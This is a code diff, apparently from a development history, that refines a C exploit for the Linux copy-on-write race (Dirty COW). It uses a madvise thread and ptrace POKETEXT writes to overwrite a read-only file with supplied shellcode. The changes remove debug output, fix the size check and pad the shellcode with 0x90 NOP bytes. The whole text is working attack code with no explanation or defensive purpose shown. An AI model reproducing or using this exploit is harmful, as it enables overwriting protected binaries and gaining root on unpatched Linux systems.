@@ -60,7 +60,6 @@ static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n) {
 
     errno = 0;
     if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1) {
-      printf("pof %d\n",errno);
       return -1;
     }
 
@@ -115,8 +114,6 @@ static void *madvthread(void *arg) {
 }
 
 int main(int argc, const char *argv[]) {
-  printf("HEJ\n");
-  
   const char * ffile = argv[1];
   const char * tfile = argv[2];
 
@@ -124,41 +121,44 @@ int main(int argc, const char *argv[]) {
   struct stat st2;
 
   struct mem_arg *marg=(struct mem_arg *)malloc(sizeof(struct mem_arg));
-
+  int i = 0;
+  
   int f = open(ffile, O_RDONLY);
   int f2 = open(tfile, O_RDONLY);
 
   fstat(f, &st);
   fstat(f2, &st2);
 
-  size_t size = st.st_size;
+  size_t size = st2.st_size;
 
-  if (size>st2.st_size) {
-    printf("Shell too long");
+  if (size<st.st_size) {
+    printf("Shellcode too long");
     return 1;
   }
-
-  //size_t orgsize = size;
-
-  //size = st2.st_size;
   
   (*marg).patch = malloc(size);
   (*marg).patch_size = size;
 
   (*marg).fname = argv[2];
 
-  read(f,(*marg).patch, size);
+  read(f,(*marg).patch, st.st_size);
   close(f);
+
+  char ch = 0x90;
+  char *str = &ch;
+  
+  for (i=st.st_size;i<size;i++) {
+    memcpy(&((*marg).patch[i]),str,1);
+  }
+  
   printf("%s\n",(char*)marg->patch);
 
   void *map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, f2, 0);
 
   if (map == MAP_FAILED) {
-    printf("GOGLEA");
+    printf("map failed!");
     return(-1);
   }
-
-  //printf("%ld\n", (long)map);
 
   (*marg).offset = map;
   
@@ -169,7 +169,6 @@ int main(int argc, const char *argv[]) {
   pid = fork();
   if (pid) {
     pthread_create(&pt1, NULL, checkthread, marg);
-    //printf("%ld\n",ptrace(PTRACE_ATTACH,pid));
     waitpid(pid,NULL,0);
     ptracethread((void*)marg);
     pthread_join(pt1,NULL);
